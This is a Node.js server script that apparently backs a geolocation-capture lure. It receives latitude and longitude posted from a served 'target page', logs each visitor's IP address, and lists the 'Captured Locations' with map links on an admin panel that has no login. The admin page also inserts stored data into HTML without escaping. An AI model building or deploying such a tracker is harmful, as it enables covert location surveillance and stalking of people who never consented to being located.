const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000; 
const DATA_FILE = path.join(__dirname, 'data.json');

// Initialize data file if it doesn't exist
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

const server = http.createServer((req, res) => {
    // Handle CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');

    // Serve the main index.html page
    if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading index.html');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(content);
            }
        });
    } 
    // Receive location data
    else if (req.method === 'POST' && req.url === '/location') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const currentData = JSON.parse(fs.readFileSync(DATA_FILE));
                
                // Get IP address
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
                
                data.time = new Date().toLocaleString();
                data.ip = ip; // Save IP address
                
                currentData.push(data);
                fs.writeFileSync(DATA_FILE, JSON.stringify(currentData, null, 2)); // Save to JSON file
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));
            } catch (e) {
                res.writeHead(400);
                res.end('Invalid JSON');
            }
        });
    }
    // Admin Panel Route
    else if (req.method === 'GET' && req.url === '/admin') {
        const currentData = JSON.parse(fs.readFileSync(DATA_FILE));
        
        // Build table rows
        let rows = currentData.map((d, i) => ({...d, originalIndex: i})).reverse().map(d => `
            <tr>
                <td>${d.time}</td>
                <td>${d.ip || 'Unknown'}</td>
                <td>${d.lat}</td>
                <td>${d.lng}</td>
                <td>
                    <a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank" class="btn">View on Map</a>
                    <button onclick="deleteEntry(${d.originalIndex})" class="btn" style="background:#ff4444; margin-left: 5px; cursor: pointer; border: none;">Delete</button>
                </td>
            </tr>
        `).join('');

        const adminHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Panel</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; background: #e9ecef; }
                    .container { max-width: 1000px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
                    h2 { color: #333; border-bottom: 2px solid #ff4444; padding-bottom: 10px; }
                    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                    th, td { padding: 12px; border: 1px solid #ddd; text-align: center; }
                    th { background-color: #333; color: white; }
                    tr:nth-child(even) { background-color: #f8f9fa; }
                    .btn { background: #dc3545; color: white; padding: 8px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; }
                    .btn:hover { background: #c82333; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>📍 Captured Locations</h2>
                    <table>
                        <tr>
                            <th>Time Captured</th>
                            <th>IP Address</th>
                            <th>Latitude</th>
                            <th>Longitude</th>
                            <th>Google Maps</th>
                        </tr>
                        ${rows.length ? rows : '<tr><td colspan="5">No data received yet.</td></tr>'}
                    </table>
                </div>
                <script>
                    function deleteEntry(index) {
                        if(confirm('Are you sure you want to delete this entry?')) {
                            fetch('/delete', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ index: index })
                            }).then(res => {
                                if(res.ok) window.location.reload();
                            });
                        }
                    }
                </script>
            </body>
            </html>
        `;
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(adminHtml);
    } 
    // Delete Route
    else if (req.method === 'POST' && req.url === '/delete') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const { index } = JSON.parse(body);
                const currentData = JSON.parse(fs.readFileSync(DATA_FILE));
                if (index >= 0 && index < currentData.length) {
                    currentData.splice(index, 1);
                    fs.writeFileSync(DATA_FILE, JSON.stringify(currentData, null, 2));
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));
            } catch (e) {
                res.writeHead(400);
                res.end('Error deleting entry');
            }
        });
    }
    else {
        res.writeHead(404);
        res.end('Not Found');
    }
});

server.listen(PORT, () => {
    console.log(`[*] Target Page Running at: http://localhost:${PORT}/`);
    console.log(`[*] Admin Panel Running at: http://localhost:${PORT}/admin`);
});
